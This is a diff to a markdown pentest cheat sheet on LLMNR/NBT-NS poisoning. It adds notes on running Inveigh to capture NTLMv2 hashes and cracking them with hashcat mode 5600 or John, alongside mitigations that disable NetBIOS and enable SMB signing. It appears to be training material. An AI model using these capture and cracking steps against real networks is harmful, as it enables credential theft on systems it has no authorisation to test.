@@ -21,6 +21,7 @@ GET NTLMV2UNIQUE        # one hash per user — clean for cracking
 # STEP 4 — Copy hash to Linux, crack
 hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
 ```
+> `Inveigh.exe` is the C# version — run it, then press ESC for the interactive console. `GET NTLMV2UNIQUE` gives one hash per user, which is cleanest for cracking. Copy the hash to your Kali box and crack it with Hashcat mode `5600`.
 
 ---
 
@@ -30,6 +31,7 @@ hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
 .\Inveigh.exe
 # Press ESC → interactive console
 ```
+> Run this from `C:\Tools`. Inveigh listens for LLMNR/NBT-NS broadcasts and captures NTLMv2 hashes. ESC drops into the interactive console where you can query captured hashes.
 
 **Interactive console commands:**
 
@@ -49,6 +51,7 @@ hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 ```
+> Legacy PowerShell version. `-NBNS Y` enables NetBIOS Name Service poisoning. `-FileOutput Y` saves hashes to disk automatically. Prefer `Inveigh.exe` instead — the PS version is no longer maintained.
 
 Use C# version (`Inveigh.exe`) — PowerShell version is no longer maintained.
 
@@ -60,6 +63,7 @@ Use C# version (`Inveigh.exe`) — PowerShell version is no longer maintained.
 hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt   # NTLMv2
 john user.hash --wordlist=/usr/share/wordlists/rockyou.txt   # fallback
 ```
+> Mode `5600` is NTLMv2 in Hashcat. Use John as a fallback when Hashcat has OpenCL driver issues.
 
 ---
 
@@ -78,6 +82,7 @@ Get-ChildItem $regkey | foreach {
     Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2
 }
 ```
+> Sets `NetbiosOptions = 2` on every network interface. This disables NetBIOS over TCP/IP (NBT-NS). Deploy as a Group Policy Object (GPO) startup script to apply domain-wide.
 
 ### Other controls
 - Enable **SMB Signing** — prevents relay even if hashes are captured
